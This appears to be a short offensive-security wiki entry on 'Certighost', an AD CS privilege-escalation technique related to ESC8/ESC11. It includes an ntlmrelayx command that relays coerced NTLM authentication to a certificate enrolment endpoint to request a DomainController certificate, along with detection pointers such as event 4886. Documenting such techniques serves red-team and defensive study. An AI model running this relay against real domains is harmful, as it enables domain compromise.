---
id: certighost
type: technique
label: "Certighost"
phase: "privesc"
tools: ["certipy"]
cve: "cve-2026-54121"
detect: "Correlate AD CS authorization/configuration changes, CA network access, certificate requests and issuance; no unique CVE event signature is established."
mitre: "T1649"
tag: "new"
---


# Certighost

### Affected object / attribute
**ADCS enrolment endpoint / coercion path** (2025 research). **Verify against current research before operational use.**

### Concept (deep)
An **ESC8/ESC11-adjacent** chain that abuses certificate enrolment where NTLM is accepted via a coercion path.

### Commands
Same relay skeleton as ESC8/ESC11:
```bash
ntlmrelayx.py -t http://10.10.10.20/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

### Detection
NTLM to CA endpoints; **4886** issued to a machine that did not request it.

---
